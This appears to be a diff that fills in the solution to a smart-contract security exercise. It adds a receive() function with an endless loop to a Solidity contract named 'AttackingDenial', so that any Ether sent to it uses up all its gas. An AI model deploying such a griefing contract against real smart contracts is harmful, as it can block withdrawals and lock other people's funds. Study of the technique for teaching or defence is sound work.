@@ -10,4 +10,9 @@ contract AttackingDenial {
     }
 
     //Code me!
+    receive() external payable {
+        while(true) {
+            console.log("Depleting funds!");
+        }
+    }
 }
